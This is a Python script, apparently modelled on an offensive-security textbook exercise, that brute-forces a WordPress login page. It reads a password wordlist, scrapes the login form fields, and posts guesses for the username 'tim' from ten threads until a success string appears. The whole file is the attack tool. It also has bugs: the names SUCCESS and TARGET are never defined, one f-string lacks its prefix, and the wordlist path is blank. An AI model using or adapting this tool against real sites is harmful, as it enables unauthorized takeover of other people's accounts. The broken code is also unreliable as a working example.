# wordpress password cracker

# imports
from io import BytesIO
from lxml import etree
from queue import Queue
import requests
import threading
import sys
import time
#success flag
success = "welcome to wordpress"
#input target login field to attack
target = "example.com/wp-login.php"
#path to txt payload list 
wordlist = ""

def get_words():
    with open(wordlist) as f:
        raw_words= f.read()
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words
#recieve HTTP content, parse, loop through input elems and create dict
def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parsers=parser)
    for elem in tree.findall('//input'):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params


class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False

        print(f"\nBrute Force Attack beginning on {url}.\n")
        print("Finished the setup where username = {username}\n")
        
    def run_bruteforce(self, passwords):
        #start 10 threads 
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self,passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params["log"] = self.username

        # contine while passwords to try and valid not found

        while not passwords.empty() and not self.found:

        

            time.sleep(5)
            passwd = passwords.get()

            print (f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            resp1 = session.post(self.url, data = params)

            if SUCCESS in resp1.content.decode():

                self.found = True
                print(f"\nBruteforcing successful.")
                print("Username is %s" % self.username)
                print("Password is %s\n" % passwd) 
                print('done: now cleaning up other threads. . .')



if __name__ == '__main__':
    # load the password worlist into a queue
    words = get_words()
    # initialize the Bruter class
    b = Bruter('tim', TARGET)

    b.run_bruteforce(words)








